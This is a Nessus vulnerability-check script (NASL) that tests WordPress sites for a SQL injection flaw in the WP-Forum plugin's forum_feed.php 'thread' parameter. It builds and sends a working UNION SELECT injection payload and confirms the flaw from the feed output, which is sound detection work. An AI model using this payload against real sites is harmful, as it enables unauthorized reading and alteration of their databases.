#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35370);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(33223);
  script_xref(name:"milw0rm", value:"7738");

  script_name(english:"WordPress WP-Forum forum_feed.php thread Parameter SQL Injection");
  script_summary(english:"Tries to manipulate feed results");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running WP-Forum, a third-party discussion forum
plugin for WordPress. 

The version of WP-Forum installed on the remote host fails to sanitize
input to the 'thread' parameter of the 'forum_feed.php' script before
using it in a database query.  Regardless of PHP's 'magic_quotes_gpc'
setting, an attacker may be able to exploit this issue to manipulate
database queries, leading to disclosure of sensitive information,
modification of data, or attacks against the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


magic1 = SCRIPT_NAME;
enc_magic1 = string("char(");
for (i=0; i<strlen(magic1)-1; i++)
  enc_magic1 += ord(magic1[i]) + ",";
enc_magic1 += ord(magic1[i]) + ")";
magic2 = unixtime();
exploit = string("-99999 UNION SELECT 1,", enc_magic1, ",", magic2, ",4,5,6,7-- ");


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to manipulate the feed output.
  url = string(
    dir, "/wp-content/plugins/wp-forum/forum_feed.php?",
    "thread=", str_replace(find:" ", replace:"%20", string:exploit)
  );
  req = http_mk_get_req(port:port, item:url);
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);

  # There's a problem if we could manipulate the feed output.
  if (
    string("<description>", magic1, "</description>") >< res[2] &&
    string("&amp;thread=", magic2, "&amp;start=") >< res[2]
  )
  {
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);

    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);
      report = string(
        "\n",
        "Nessus was able to verify the vulnerability exists using the following\n",
        "request :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
  }
}
